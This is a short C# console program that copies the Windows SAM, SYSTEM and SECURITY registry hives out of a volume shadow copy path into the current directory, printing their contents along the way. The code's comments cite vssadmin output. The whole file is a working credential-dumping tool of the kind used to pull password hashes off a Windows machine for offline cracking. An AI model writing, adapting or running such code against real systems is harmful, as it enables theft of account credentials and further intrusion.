using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;

namespace readfile
{
    class Program
    {
        //Traverse the directory
        public static void Traversal(string path)
        {
            DirectoryInfo TheFolder = new DirectoryInfo(path);

            FileSystemInfo[] a = TheFolder.GetFileSystemInfos();
            List<String> list = new List<string>();
            foreach (FileSystemInfo NextFile in a)
            {
                list.Add(NextFile.FullName);
                Console.WriteLine(NextFile.FullName);
            }
        }

        public static bool CopyFileToCurrentPath(string filepath,string currentpath)
        {
            bool result = false;
            try
            {
                FileInfo file = new FileInfo(filepath);
                Console.WriteLine("Attributes :>> " + file.Attributes);
                Console.WriteLine("FullName :>> " + file.FullName);
                Console.WriteLine("LastWriteTime :>> " + file.LastWriteTime);
                Console.WriteLine("Length :>> " + file.Length);
                Console.WriteLine("Name And Extension :>> " + file.Name + "." + file.Extension);

                FileStream fs = File.OpenRead(filepath);
                byte[] filebyte = new byte[file.Length];
                UTF8Encoding temp = new UTF8Encoding(true);
                while (fs.Read(filebyte, 0, filebyte.Length) > 0)
                {
                    Console.WriteLine(temp.GetString(filebyte));
                }

                string filename = currentpath + @"\" + file.Name + "." + file.Extension;
                Console.WriteLine(filename);
                FileStream fs2 = new FileStream(filename, FileMode.OpenOrCreate, FileAccess.Write);
                fs2.Write(filebyte, 0, filebyte.Length);
                result = true;
            }
            catch
            {
                result = false;
            }
            return result;

        }

        static void Main(string[] args)
        {
            string currentpath = System.Environment.CurrentDirectory;

            //Backup path, from the administrator's command vssadmin list shadows
            //The default is \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy, the difference is only when there are multiple backups
            string vsspath = @"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3";

            //sam and system file path
            string sampath = @"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM";
            string systempath = @"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SYSTEM";
            string securitypath = @"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SECURITY";

            //Traversal(vsspath);
            CopyFileToCurrentPath(sampath, currentpath);
            CopyFileToCurrentPath(systempath, currentpath);
            CopyFileToCurrentPath(securitypath, currentpath);
        }
    }
}
